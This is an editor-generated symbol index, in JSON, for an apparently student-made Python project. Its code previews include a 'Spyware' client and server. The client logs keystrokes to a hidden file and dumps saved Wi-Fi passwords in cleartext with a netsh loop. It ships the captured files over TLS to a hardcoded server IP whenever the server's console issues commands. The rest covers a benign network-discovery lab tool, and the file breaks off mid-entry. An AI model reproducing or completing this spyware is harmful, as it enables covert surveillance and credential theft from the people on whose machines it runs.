[
    {
        "label": "socket",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "socket",
        "description": "socket",
        "detail": "socket",
        "documentation": {}
    },
    {
        "label": "ssl",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "ssl",
        "description": "ssl",
        "detail": "ssl",
        "documentation": {}
    },
    {
        "label": "os",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os",
        "description": "os",
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "Key",
        "importPath": "pynput.keyboard",
        "description": "pynput.keyboard",
        "isExtraImport": true,
        "detail": "pynput.keyboard",
        "documentation": {}
    },
    {
        "label": "Listener",
        "importPath": "pynput.keyboard",
        "description": "pynput.keyboard",
        "isExtraImport": true,
        "detail": "pynput.keyboard",
        "documentation": {}
    },
    {
        "label": "logging",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "logging",
        "description": "logging",
        "detail": "logging",
        "documentation": {}
    },
    {
        "label": "platform",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "platform",
        "description": "platform",
        "detail": "platform",
        "documentation": {}
    },
    {
        "label": "threading",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "threading",
        "description": "threading",
        "detail": "threading",
        "documentation": {}
    },
    {
        "label": "subprocess",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "subprocess",
        "description": "subprocess",
        "detail": "subprocess",
        "documentation": {}
    },
    {
        "label": "colors",
        "importPath": "Tools.Color",
        "description": "Tools.Color",
        "isExtraImport": true,
        "detail": "Tools.Color",
        "documentation": {}
    },
    {
        "label": "colors",
        "importPath": "Tools.Color",
        "description": "Tools.Color",
        "isExtraImport": true,
        "detail": "Tools.Color",
        "documentation": {}
    },
    {
        "label": "colors",
        "importPath": "Tools.Color",
        "description": "Tools.Color",
        "isExtraImport": true,
        "detail": "Tools.Color",
        "documentation": {}
    },
    {
        "label": "colors",
        "importPath": "Tools.Color",
        "description": "Tools.Color",
        "isExtraImport": true,
        "detail": "Tools.Color",
        "documentation": {}
    },
    {
        "label": "datetime",
        "importPath": "datetime",
        "description": "datetime",
        "isExtraImport": true,
        "detail": "datetime",
        "documentation": {}
    },
    {
        "label": "terminal",
        "importPath": "Tools.Loop.terminal",
        "description": "Tools.Loop.terminal",
        "isExtraImport": true,
        "detail": "Tools.Loop.terminal",
        "documentation": {}
    },
    {
        "label": "receive_file",
        "importPath": "Tools.File_Tools.file",
        "description": "Tools.File_Tools.file",
        "isExtraImport": true,
        "detail": "Tools.File_Tools.file",
        "documentation": {}
    },
    {
        "label": "print_directory_tree",
        "importPath": "Tools.File_Tools.file",
        "description": "Tools.File_Tools.file",
        "isExtraImport": true,
        "detail": "Tools.File_Tools.file",
        "documentation": {}
    },
    {
        "label": "read_file_in_target",
        "importPath": "Tools.File_Tools.file",
        "description": "Tools.File_Tools.file",
        "isExtraImport": true,
        "detail": "Tools.File_Tools.file",
        "documentation": {}
    },
    {
        "label": "sys",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "sys",
        "description": "sys",
        "detail": "sys",
        "documentation": {}
    },
    {
        "label": "display_help",
        "importPath": "Tools.Help.help",
        "description": "Tools.Help.help",
        "isExtraImport": true,
        "detail": "Tools.Help.help",
        "documentation": {}
    },
    {
        "label": "ip",
        "importPath": "Tools.Network.network",
        "description": "Tools.Network.network",
        "isExtraImport": true,
        "detail": "Tools.Network.network",
        "documentation": {}
    },
    {
        "label": "loop",
        "importPath": "Tools.Loop.loop",
        "description": "Tools.Loop.loop",
        "isExtraImport": true,
        "detail": "Tools.Loop.loop",
        "documentation": {}
    },
    {
        "label": "main",
        "importPath": "Tools.Main.main",
        "description": "Tools.Main.main",
        "isExtraImport": true,
        "detail": "Tools.Main.main",
        "documentation": {}
    },
    {
        "label": "parse_ipconfig_content_linux",
        "importPath": "Tools.interfaces",
        "description": "Tools.interfaces",
        "isExtraImport": true,
        "detail": "Tools.interfaces",
        "documentation": {}
    },
    {
        "label": "parse_ipconfig_content_windows",
        "importPath": "Tools.interfaces",
        "description": "Tools.interfaces",
        "isExtraImport": true,
        "detail": "Tools.interfaces",
        "documentation": {}
    },
    {
        "label": "re",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "re",
        "description": "re",
        "detail": "re",
        "documentation": {}
    },
    {
        "label": "mask_cidr",
        "importPath": "Tools.mask",
        "description": "Tools.mask",
        "isExtraImport": true,
        "detail": "Tools.mask",
        "documentation": {}
    },
    {
        "label": "mask_cidr",
        "importPath": "Tools.mask",
        "description": "Tools.mask",
        "isExtraImport": true,
        "detail": "Tools.mask",
        "documentation": {}
    },
    {
        "label": "get_linux_info",
        "importPath": "Linux.linux",
        "description": "Linux.linux",
        "isExtraImport": true,
        "detail": "Linux.linux",
        "documentation": {}
    },
    {
        "label": "get_windows_info",
        "importPath": "Windows.windows",
        "description": "Windows.windows",
        "isExtraImport": true,
        "detail": "Windows.windows",
        "documentation": {}
    },
    {
        "label": "display_help",
        "importPath": "Tools.argument",
        "description": "Tools.argument",
        "isExtraImport": true,
        "detail": "Tools.argument",
        "documentation": {}
    },
    {
        "label": "display_argument_help",
        "importPath": "Tools.argument",
        "description": "Tools.argument",
        "isExtraImport": true,
        "detail": "Tools.argument",
        "documentation": {}
    },
    {
        "label": "ipaddress",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "ipaddress",
        "description": "ipaddress",
        "detail": "ipaddress",
        "documentation": {}
    },
    {
        "label": "argparse",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "argparse",
        "description": "argparse",
        "detail": "argparse",
        "documentation": {}
    },
    {
        "label": "check_platform",
        "importPath": "TP1",
        "description": "TP1",
        "isExtraImport": true,
        "detail": "TP1",
        "documentation": {}
    },
    {
        "label": "init",
        "importPath": "TP1",
        "description": "TP1",
        "isExtraImport": true,
        "detail": "TP1",
        "documentation": {}
    },
    {
        "label": "struct",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "struct",
        "description": "struct",
        "detail": "struct",
        "documentation": {}
    },
    {
        "label": "ping",
        "importPath": "ping3",
        "description": "ping3",
        "isExtraImport": true,
        "detail": "ping3",
        "documentation": {}
    },
    {
        "label": "verbose_ping",
        "importPath": "ping3",
        "description": "ping3",
        "isExtraImport": true,
        "detail": "ping3",
        "documentation": {}
    },
    {
        "label": "save_command_result",
        "kind": 2,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "def save_command_result(output_file):\n    command = 'for /f \"skip=9 tokens=1,2 delims=:\" %i in (\\'netsh wlan show profiles\\') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear'\n    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\n    output, error = process.communicate()\n    if error:\n        print(\"An error occurred:\", error)\n    else:\n        with open(output_file, 'w') as f:\n            f.write(output)\ndef check_platform():",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "check_platform",
        "kind": 2,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "def check_platform():\n    return platform.system()\ndef find_ca_cert_path():\n    for r, d, files in os.walk(\"c:\\\\\"):\n        for filename in files:\n            if filename == \"ca-cert.pem\":\n                path = os.path.join(r, filename)\n                if path.endswith(\"SSL\\\\CA\\\\ca-cert.pem\"):\n                    return path\n    return None",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "find_ca_cert_path",
        "kind": 2,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "def find_ca_cert_path():\n    for r, d, files in os.walk(\"c:\\\\\"):\n        for filename in files:\n            if filename == \"ca-cert.pem\":\n                path = os.path.join(r, filename)\n                if path.endswith(\"SSL\\\\CA\\\\ca-cert.pem\"):\n                    return path\n    return None\ndef os_check():\n    current_platform = check_platform()",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "os_check",
        "kind": 2,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "def os_check():\n    current_platform = check_platform()\n    if current_platform == 'Windows':\n        return 'Windows'\n    elif current_platform == 'Linux':\n        return 'Linux'\n    else:\n        return None\ndef delete_hidden_file(file):\n    os.remove(file)",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "delete_hidden_file",
        "kind": 2,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "def delete_hidden_file(file):\n    os.remove(file)\ndef send_file(conn, filename):\n    with open(filename, 'rb') as f:\n        while True:\n            chunk = f.read(1024)\n            if not chunk:\n                break\n            conn.sendall(chunk)\ndef key_logger(hidden_file_path, client_ssl):",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "send_file",
        "kind": 2,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "def send_file(conn, filename):\n    with open(filename, 'rb') as f:\n        while True:\n            chunk = f.read(1024)\n            if not chunk:\n                break\n            conn.sendall(chunk)\ndef key_logger(hidden_file_path, client_ssl):\n    logging.basicConfig(filename=hidden_file_path, level=logging.DEBUG, format=\"%(asctime)s - %(message)s\")\n    os.system(f\"attrib +h {hidden_file_path}\")",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "key_logger",
        "kind": 2,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "def key_logger(hidden_file_path, client_ssl):\n    logging.basicConfig(filename=hidden_file_path, level=logging.DEBUG, format=\"%(asctime)s - %(message)s\")\n    os.system(f\"attrib +h {hidden_file_path}\")\n    def on_press(key):\n        logging.info(str(key))\n    with Listener(on_press=on_press) as listener:\n        server_listener_thread = threading.Thread(target=listen_to_server, args=(client_ssl,))\n        server_listener_thread.start()\n        server_listener_thread.join()\n        listener.stop()",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "listen_to_server",
        "kind": 2,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "def listen_to_server(client_ssl):\n    while True:\n        msg = client_ssl.recv(1024).decode()\n        print(f\"Server : {msg}\")\n        if msg == \"STOP\":\n            print(\"stop\")\n            send_file(client_ssl, \"its_a_trap.txt\")\n            exit(1)\n        if msg == \"WIFI\":\n            output_file = 'result.txt'",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "timeout_handler",
        "kind": 2,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "def timeout_handler(client_ssl):\n    print(\"Connection timed out after 10 minutes.\")\n    client_ssl.close()\ndef main():\n    os_local = os_check()\n    if os_local == 'Windows':\n        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n        context.load_verify_locations(cadata=CA_CERTIFICATE)\n        host = '10.56.182.51'  # Replace with the server IP\n        port = 90",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "def main():\n    os_local = os_check()\n    if os_local == 'Windows':\n        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n        context.load_verify_locations(cadata=CA_CERTIFICATE)\n        host = '10.56.182.51'  # Replace with the server IP\n        port = 90\n        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        client_ssl = context.wrap_socket(socket_obj, server_hostname=host)\n        client_ssl.connect((host, port))",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "CA_CERTIFICATE",
        "kind": 5,
        "importPath": "Spyware.client.client",
        "description": "Spyware.client.client",
        "peekOfCode": "CA_CERTIFICATE = \"\"\"\n-----BEGIN CERTIFICATE-----\nMIIFWzCCA0OgAwIBAgIUari75NCqf8/CKW/N2pWRnf0lX7MwDQYJKoZIhvcNAQEL\nBQAwPTELMAkGA1UEBhMCZWQxCzAJBgNVBAgMAmVkMSEwHwYDVQQKDBhJbnRlcm5l\ndCBXaWRnaXRzIFB0eSBMdGQwHhcNMjQwMjEzMDc1NDQ3WhcNMjUwMjEyMDc1NDQ3\nWjA9MQswCQYDVQQGEwJlZDELMAkGA1UECAwCZWQxITAfBgNVBAoMGEludGVybmV0\nIFdpZGdpdHMgUHR5IEx0ZDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB\nALO/O5doUtSJdxpBNY+CMMfeEyA7hiCSFNyuJjpjGQGqS4Yu2QHuie22nVGKTjBO\nhSdOsJmFovKptBqKCZuPPoeJeJz1O1VGudF2uhhRLmunW/DUncSFAiMX118tTSU1\nPFKnPwWuCRtNVlxIKV2K834Bb94pNrOZllW99NoTpU5kKLooREegJ8PCjty1JHBq",
        "detail": "Spyware.client.client",
        "documentation": {}
    },
    {
        "label": "green",
        "kind": 5,
        "importPath": "Spyware.server.Tools.Color.colors",
        "description": "Spyware.server.Tools.Color.colors",
        "peekOfCode": "green = \"\\x1b[32m\"\nblue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\nrainbow = \"\\x1b[31mS\\x1b[33mp\\x1b[32my\\x1b[36mw\\x1b[34ma\\x1b[35mr\\x1b[31me\\x1b[0m\"",
        "detail": "Spyware.server.Tools.Color.colors",
        "documentation": {}
    },
    {
        "label": "blue",
        "kind": 5,
        "importPath": "Spyware.server.Tools.Color.colors",
        "description": "Spyware.server.Tools.Color.colors",
        "peekOfCode": "blue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\nrainbow = \"\\x1b[31mS\\x1b[33mp\\x1b[32my\\x1b[36mw\\x1b[34ma\\x1b[35mr\\x1b[31me\\x1b[0m\"",
        "detail": "Spyware.server.Tools.Color.colors",
        "documentation": {}
    },
    {
        "label": "red",
        "kind": 5,
        "importPath": "Spyware.server.Tools.Color.colors",
        "description": "Spyware.server.Tools.Color.colors",
        "peekOfCode": "red = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\nrainbow = \"\\x1b[31mS\\x1b[33mp\\x1b[32my\\x1b[36mw\\x1b[34ma\\x1b[35mr\\x1b[31me\\x1b[0m\"",
        "detail": "Spyware.server.Tools.Color.colors",
        "documentation": {}
    },
    {
        "label": "orange",
        "kind": 5,
        "importPath": "Spyware.server.Tools.Color.colors",
        "description": "Spyware.server.Tools.Color.colors",
        "peekOfCode": "orange = \"\\x1b[38;5;220m\"\nrainbow = \"\\x1b[31mS\\x1b[33mp\\x1b[32my\\x1b[36mw\\x1b[34ma\\x1b[35mr\\x1b[31me\\x1b[0m\"",
        "detail": "Spyware.server.Tools.Color.colors",
        "documentation": {}
    },
    {
        "label": "rainbow",
        "kind": 5,
        "importPath": "Spyware.server.Tools.Color.colors",
        "description": "Spyware.server.Tools.Color.colors",
        "peekOfCode": "rainbow = \"\\x1b[31mS\\x1b[33mp\\x1b[32my\\x1b[36mw\\x1b[34ma\\x1b[35mr\\x1b[31me\\x1b[0m\"",
        "detail": "Spyware.server.Tools.Color.colors",
        "documentation": {}
    },
    {
        "label": "receive_file",
        "kind": 2,
        "importPath": "Spyware.server.Tools.File_Tools.file",
        "description": "Spyware.server.Tools.File_Tools.file",
        "peekOfCode": "def receive_file(conn, filename):\n    \"\"\"Reçoit un fichier du client et le sauvegarde localement.\"\"\"\n    with open(filename, 'wb') as f:\n            chunk = conn.recv(1024) \n            if not chunk:\n                exit(1)\n            f.write(chunk)\ndef print_directory_tree(root_dir, indent=''):\n    \"\"\"\n    Affiche l'arborescence du répertoire à partir de root_dir.",
        "detail": "Spyware.server.Tools.File_Tools.file",
        "documentation": {}
    },
    {
        "label": "print_directory_tree",
        "kind": 2,
        "importPath": "Spyware.server.Tools.File_Tools.file",
        "description": "Spyware.server.Tools.File_Tools.file",
        "peekOfCode": "def print_directory_tree(root_dir, indent=''):\n    \"\"\"\n    Affiche l'arborescence du répertoire à partir de root_dir.\n    \"\"\"\n    if os.path.isdir(root_dir):\n        print(indent + os.path.basename(root_dir) + '/')\n        indent += '  '\n        for item in os.listdir(root_dir):\n            print_directory_tree(os.path.join(root_dir, item), indent)\n    else:",
        "detail": "Spyware.server.Tools.File_Tools.file",
        "documentation": {}
    },
    {
        "label": "read_file_in_target",
        "kind": 2,
        "importPath": "Spyware.server.Tools.File_Tools.file",
        "description": "Spyware.server.Tools.File_Tools.file",
        "peekOfCode": "def read_file_in_target(filename):\n    \"\"\"\n    Lit le contenu du fichier situé dans le répertoire 'Target'.\n    \"\"\"\n    target_dir = 'Target'\n    filepath = os.path.join(target_dir, filename)\n    if os.path.isfile(filepath):\n        with open(filepath, 'r') as file:\n            content = file.read()\n        return content",
        "detail": "Spyware.server.Tools.File_Tools.file",
        "documentation": {}
    },
    {
        "label": "display_help",
        "kind": 2,
        "importPath": "Spyware.server.Tools.Help.help",
        "description": "Spyware.server.Tools.Help.help",
        "peekOfCode": "def display_help():\n    \"\"\"Affiche l'aide et les différentes options disponibles.\"\"\"\n    print(f\"{colors.green}-h/--help : affiche l'aide et les différentes options.\")\n    print(f\"-l/--listen <port> : se met en écoute sur le port TCP saisi par l'utilisateur et attend les données du spyware.\")\n    print(f\"-s/--show : affiche la liste des fichiers réceptionnées par le programme.\")\n    print(f\"-r/--readfile <nom_fichier> : affiche le contenu du fichier stocké sur le serveur du spyware. Le contenu doit\")\n    print(f\"-k/--kill : arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de supprimer la capture\")",
        "detail": "Spyware.server.Tools.Help.help",
        "documentation": {}
    },
    {
        "label": "loop",
        "kind": 2,
        "importPath": "Spyware.server.Tools.Loop.loop",
        "description": "Spyware.server.Tools.Loop.loop",
        "peekOfCode": "def loop(port, host, client_ssl, ip_client):\n    \"\"\"Boucle principale de traitement des commandes.\"\"\"\n    while True:\n        print(f\"{colors.orange}Welcome to the lobby of your Spyware\")\n        target_dir = \"Target\"\n        current_time = datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\")\n        print(f\"\"\"♦ your server is listening on the port {port}\n                    \\n✅ on Server: {host}\n                    \\n✅ Connected to Client IP: {str(ip_client)}\n                    \\n• 'k'/'kill' to stop the spyware and save the result of the client",
        "detail": "Spyware.server.Tools.Loop.loop",
        "documentation": {}
    },
    {
        "label": "terminal",
        "kind": 2,
        "importPath": "Spyware.server.Tools.Loop.terminal",
        "description": "Spyware.server.Tools.Loop.terminal",
        "peekOfCode": "def terminal():\n    \"\"\"Fonction qui gère l'interaction avec l'utilisateur dans le terminal.\"\"\"\n    cli = input(f\"{colors.rainbow}root:~$\")\n    return cli",
        "detail": "Spyware.server.Tools.Loop.terminal",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "Spyware.server.Tools.Main.main",
        "description": "Spyware.server.Tools.Main.main",
        "peekOfCode": "def main(param):\n    \"\"\"Fonction principale du programme.\"\"\"\n    if param == 3:\n        print(f\"{colors.blue} You need a argument to specify --help for more details\")\n    if param == 1:\n        display_help()\n    if param == 4:\n        print_directory_tree('Target')\n    if param == 5:\n        content_file = read_file_in_target(sys.argv[2])",
        "detail": "Spyware.server.Tools.Main.main",
        "documentation": {}
    },
    {
        "label": "ip",
        "kind": 2,
        "importPath": "Spyware.server.Tools.Network.network",
        "description": "Spyware.server.Tools.Network.network",
        "peekOfCode": "def ip():\n    \"\"\"Récupère l'adresse IP locale du serveur.\"\"\"\n    hostname = socket.gethostname()\n    your_ip = socket.gethostbyname(hostname)\n    print(\"Server local IP :\", your_ip)\n    return str(your_ip)",
        "detail": "Spyware.server.Tools.Network.network",
        "documentation": {}
    },
    {
        "label": "get_linux_info",
        "kind": 2,
        "importPath": "TP.Linux.linux",
        "description": "TP.Linux.linux",
        "peekOfCode": "def get_linux_info():\n    print(\"Running on Linux\")\n    ifconfig_output = subprocess.check_output(['ip a'], shell=True, universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ifconfig_output)\n    files = os.listdir('.')\n    print(f\"{green} [+]Files in the current directory:\", files)\n    with open(path_txt, 'r') as file:\n        content = file.read()\n        #print(\"Content of ifconfig_info.txt:\\n\", content)",
        "detail": "TP.Linux.linux",
        "documentation": {}
    },
    {
        "label": "path_txt",
        "kind": 5,
        "importPath": "TP.Linux.linux",
        "description": "TP.Linux.linux",
        "peekOfCode": "path_txt = './ifconfig_info.txt'\ngreen = \"\\x1b[32m\"\nblue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef get_linux_info():\n    print(\"Running on Linux\")\n    ifconfig_output = subprocess.check_output(['ip a'], shell=True, universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ifconfig_output)",
        "detail": "TP.Linux.linux",
        "documentation": {}
    },
    {
        "label": "green",
        "kind": 5,
        "importPath": "TP.Linux.linux",
        "description": "TP.Linux.linux",
        "peekOfCode": "green = \"\\x1b[32m\"\nblue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef get_linux_info():\n    print(\"Running on Linux\")\n    ifconfig_output = subprocess.check_output(['ip a'], shell=True, universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ifconfig_output)\n    files = os.listdir('.')",
        "detail": "TP.Linux.linux",
        "documentation": {}
    },
    {
        "label": "blue",
        "kind": 5,
        "importPath": "TP.Linux.linux",
        "description": "TP.Linux.linux",
        "peekOfCode": "blue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef get_linux_info():\n    print(\"Running on Linux\")\n    ifconfig_output = subprocess.check_output(['ip a'], shell=True, universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ifconfig_output)\n    files = os.listdir('.')\n    print(f\"{green} [+]Files in the current directory:\", files)",
        "detail": "TP.Linux.linux",
        "documentation": {}
    },
    {
        "label": "red",
        "kind": 5,
        "importPath": "TP.Linux.linux",
        "description": "TP.Linux.linux",
        "peekOfCode": "red = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef get_linux_info():\n    print(\"Running on Linux\")\n    ifconfig_output = subprocess.check_output(['ip a'], shell=True, universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ifconfig_output)\n    files = os.listdir('.')\n    print(f\"{green} [+]Files in the current directory:\", files)\n    with open(path_txt, 'r') as file:",
        "detail": "TP.Linux.linux",
        "documentation": {}
    },
    {
        "label": "orange",
        "kind": 5,
        "importPath": "TP.Linux.linux",
        "description": "TP.Linux.linux",
        "peekOfCode": "orange = \"\\x1b[38;5;220m\"\ndef get_linux_info():\n    print(\"Running on Linux\")\n    ifconfig_output = subprocess.check_output(['ip a'], shell=True, universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ifconfig_output)\n    files = os.listdir('.')\n    print(f\"{green} [+]Files in the current directory:\", files)\n    with open(path_txt, 'r') as file:\n        content = file.read()",
        "detail": "TP.Linux.linux",
        "documentation": {}
    },
    {
        "label": "display_help",
        "kind": 2,
        "importPath": "TP.Tools.argument",
        "description": "TP.Tools.argument",
        "peekOfCode": "def display_help():\n    print(f\"{orange} [?] Usage: python.exe .\\TP\\TP.py\")\n    print(f\"{orange} [?] Options:\")\n    print(f\"{orange} [?]   -h: help\")\ndef display_argument_help():\n    print(f\"{blue} [?] -p for netdiscover with ping\")\n    print(f\"{blue} [?] -s for netdiscover with ping and port-scanner\")\n    print(f\"{blue} [?] add -o for save the result of the netdiscover on a file\")",
        "detail": "TP.Tools.argument",
        "documentation": {}
    },
    {
        "label": "display_argument_help",
        "kind": 2,
        "importPath": "TP.Tools.argument",
        "description": "TP.Tools.argument",
        "peekOfCode": "def display_argument_help():\n    print(f\"{blue} [?] -p for netdiscover with ping\")\n    print(f\"{blue} [?] -s for netdiscover with ping and port-scanner\")\n    print(f\"{blue} [?] add -o for save the result of the netdiscover on a file\")",
        "detail": "TP.Tools.argument",
        "documentation": {}
    },
    {
        "label": "green",
        "kind": 5,
        "importPath": "TP.Tools.argument",
        "description": "TP.Tools.argument",
        "peekOfCode": "green = \"\\x1b[32m\"\nblue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef display_help():\n    print(f\"{orange} [?] Usage: python.exe .\\TP\\TP.py\")\n    print(f\"{orange} [?] Options:\")\n    print(f\"{orange} [?]   -h: help\")\ndef display_argument_help():\n    print(f\"{blue} [?] -p for netdiscover with ping\")",
        "detail": "TP.Tools.argument",
        "documentation": {}
    },
    {
        "label": "blue",
        "kind": 5,
        "importPath": "TP.Tools.argument",
        "description": "TP.Tools.argument",
        "peekOfCode": "blue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef display_help():\n    print(f\"{orange} [?] Usage: python.exe .\\TP\\TP.py\")\n    print(f\"{orange} [?] Options:\")\n    print(f\"{orange} [?]   -h: help\")\ndef display_argument_help():\n    print(f\"{blue} [?] -p for netdiscover with ping\")\n    print(f\"{blue} [?] -s for netdiscover with ping and port-scanner\")",
        "detail": "TP.Tools.argument",
        "documentation": {}
    },
    {
        "label": "red",
        "kind": 5,
        "importPath": "TP.Tools.argument",
        "description": "TP.Tools.argument",
        "peekOfCode": "red = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef display_help():\n    print(f\"{orange} [?] Usage: python.exe .\\TP\\TP.py\")\n    print(f\"{orange} [?] Options:\")\n    print(f\"{orange} [?]   -h: help\")\ndef display_argument_help():\n    print(f\"{blue} [?] -p for netdiscover with ping\")\n    print(f\"{blue} [?] -s for netdiscover with ping and port-scanner\")\n    print(f\"{blue} [?] add -o for save the result of the netdiscover on a file\")",
        "detail": "TP.Tools.argument",
        "documentation": {}
    },
    {
        "label": "orange",
        "kind": 5,
        "importPath": "TP.Tools.argument",
        "description": "TP.Tools.argument",
        "peekOfCode": "orange = \"\\x1b[38;5;220m\"\ndef display_help():\n    print(f\"{orange} [?] Usage: python.exe .\\TP\\TP.py\")\n    print(f\"{orange} [?] Options:\")\n    print(f\"{orange} [?]   -h: help\")\ndef display_argument_help():\n    print(f\"{blue} [?] -p for netdiscover with ping\")\n    print(f\"{blue} [?] -s for netdiscover with ping and port-scanner\")\n    print(f\"{blue} [?] add -o for save the result of the netdiscover on a file\")",
        "detail": "TP.Tools.argument",
        "documentation": {}
    },
    {
        "label": "parse_ipconfig_content_linux",
        "kind": 2,
        "importPath": "TP.Tools.interfaces",
        "description": "TP.Tools.interfaces",
        "peekOfCode": "def parse_ipconfig_content_linux(content):\n    result = []\n    interfaces = content.split('\\n\\n')\n    number = 0\n    for interface in interfaces:\n        lines = interface.split('\\n')\n        card_name = None\n        ip = None\n        mask = None\n        gateway = None",
        "detail": "TP.Tools.interfaces",
        "documentation": {}
    },
    {
        "label": "parse_ipconfig_content_windows",
        "kind": 2,
        "importPath": "TP.Tools.interfaces",
        "description": "TP.Tools.interfaces",
        "peekOfCode": "def parse_ipconfig_content_windows(content):\n    result = []\n    lines = content.split('\\n')\n    number = 0\n    card_name = None\n    ip = None\n    mask_input = None\n    gateway = None\n    for line in lines:\n        if line.startswith(\"Carte\"):",
        "detail": "TP.Tools.interfaces",
        "documentation": {}
    },
    {
        "label": "mask_cidr",
        "kind": 2,
        "importPath": "TP.Tools.mask",
        "description": "TP.Tools.mask",
        "peekOfCode": "def mask_cidr(masque):\n    octets = masque.split('.')\n    bits_a_un = 0\n    for octet in octets:\n        bits_a_un += bin(int(octet)).count('1')\n    cidr =str(bits_a_un)\n    return cidr",
        "detail": "TP.Tools.mask",
        "documentation": {}
    },
    {
        "label": "get_windows_info",
        "kind": 2,
        "importPath": "TP.Windows.windows",
        "description": "TP.Windows.windows",
        "peekOfCode": "def get_windows_info():\n    print(\"Running on Windows\")\n    ipconfig_output = subprocess.check_output(['ipconfig'], universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ipconfig_output)\n    files = os.listdir('.')\n    print(f\"{green} [+]Files in the current directory:\", files)\n    with open(path_txt, 'r') as file:\n        content = file.read()\n        #print(\"Content of ipconfig_info.txt:\\n\", content)",
        "detail": "TP.Windows.windows",
        "documentation": {}
    },
    {
        "label": "path_txt",
        "kind": 5,
        "importPath": "TP.Windows.windows",
        "description": "TP.Windows.windows",
        "peekOfCode": "path_txt = './ifconfig_info.txt'\ngreen = \"\\x1b[32m\"\nblue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef get_windows_info():\n    print(\"Running on Windows\")\n    ipconfig_output = subprocess.check_output(['ipconfig'], universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ipconfig_output)",
        "detail": "TP.Windows.windows",
        "documentation": {}
    },
    {
        "label": "green",
        "kind": 5,
        "importPath": "TP.Windows.windows",
        "description": "TP.Windows.windows",
        "peekOfCode": "green = \"\\x1b[32m\"\nblue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef get_windows_info():\n    print(\"Running on Windows\")\n    ipconfig_output = subprocess.check_output(['ipconfig'], universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ipconfig_output)\n    files = os.listdir('.')",
        "detail": "TP.Windows.windows",
        "documentation": {}
    },
    {
        "label": "blue",
        "kind": 5,
        "importPath": "TP.Windows.windows",
        "description": "TP.Windows.windows",
